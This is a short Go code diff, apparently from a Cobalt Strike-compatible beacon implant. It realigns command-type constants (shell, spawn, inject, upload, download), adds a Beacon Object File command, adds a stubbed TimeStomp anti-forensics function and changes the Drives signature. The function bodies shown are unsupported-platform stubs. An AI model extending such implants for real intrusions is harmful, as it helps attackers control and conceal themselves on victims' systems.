@@ -58,17 +58,16 @@ const (
 )
 
 const (
-	CMD_TYPE_SLEEP        = 4
-	CMD_TYPE_PAUSE        = 47
-	CMD_TYPE_SHELL        = 78
-	CMD_TYPE_UPLOAD_START = 10
-	CMD_TYPE_UPLOAD_LOOP  = 67
-	CMD_TYPE_DOWNLOAD     = 11
-	CMD_TYPE_EXIT         = 3
-	CMD_TYPE_CD           = 5
-	CMD_TYPE_PWD          = 39
-	CMD_TYPE_FILE_BROWSE  = 53
-
+	CMD_TYPE_SLEEP                      = 4
+	CMD_TYPE_PAUSE                      = 47
+	CMD_TYPE_SHELL                      = 78
+	CMD_TYPE_UPLOAD_START               = 10
+	CMD_TYPE_UPLOAD_LOOP                = 67
+	CMD_TYPE_DOWNLOAD                   = 11
+	CMD_TYPE_EXIT                       = 3
+	CMD_TYPE_CD                         = 5
+	CMD_TYPE_PWD                        = 39
+	CMD_TYPE_FILE_BROWSE                = 53
 	CMD_TYPE_SPAWN_X64                  = 44
 	CMD_TYPE_SPAWN_X86                  = 1
 	CMD_TYPE_EXECUTE                    = 12
@@ -97,6 +96,7 @@ const (
 	CMD_TYPE_POWERSHELL_PORT            = 79
 	CMD_TYPE_INJECT_X64                 = 43
 	CMD_TYPE_INJECT_X86                 = 9
+	CMD_TYPE_BOF                        = 100
 )
 
 func ParseCommandShell(b []byte) (string, []byte, error) {
@@ -288,6 +288,10 @@ func File_Browse(b []byte) ([]byte, error) {
 
 }
 
+func TimeStomp(from []byte, to []byte) ([]byte, error) {
+	return nil, errors.New("This function is not supported on this platform now.")
+}
+
 func Execute(b []byte, Token uintptr) ([]byte, error) {
 	return nil, errors.New("This function is not supported on this platform now.")
 }
@@ -326,7 +330,7 @@ func PathExists(path string) bool {
 	return false
 }
 
-func Drives() ([]byte, error) {
+func Drives(b []byte) ([]byte, error) {
 	return nil, errors.New("This function is not supported on this platform now.")
 }
 
